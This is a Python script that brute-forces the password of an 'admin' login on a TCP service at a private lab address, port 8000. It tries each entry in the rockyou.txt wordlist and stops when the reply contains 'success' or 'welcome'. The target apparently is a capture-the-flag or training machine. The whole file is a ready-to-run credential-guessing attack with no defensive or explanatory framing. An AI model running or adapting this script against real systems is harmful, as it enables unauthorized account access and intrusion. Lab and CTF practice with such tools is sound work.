import socket

# Configuration
target_ip = "10.10.206.86"  # Target IP
target_port = 8000        # Target port
password_wordlist = "rockyou.txt"  # Path to your password wordlist file

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')

        # Receive the initial server response
        response = client_socket.recv(1024).decode()
        print(f"Server response after sending 'admin': {response}")

        # Only proceed if the server asks for the password
        if "Password:" in response:
            print(f"Trying password: {password}")
            client_socket.sendall(password.encode() + b"\n")

            # Read the server's response after sending the password
            response = client_socket.recv(1024).decode()

            # Check if the server gives an indication that the password was correct
            if "success" in response.lower() or "welcome" in response.lower():  # Adjust based on actual success message
                print(f"Correct password found: {password}")
                return True
            else:
                print(f"Password '{password}' is incorrect.")
                return False

    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        client_socket.close()

def fuzz_passwords():
    try:
        # Use a more permissive encoding or ignore encoding errors
        with open(password_wordlist, "r", encoding="utf-8", errors="ignore") as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()  # Remove any newline characters

            if connect_and_send_password(password):
                break  # Stop the loop once the correct password is found
            else:
                print(f"Password {password} was incorrect. Reconnecting...")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    fuzz_passwords()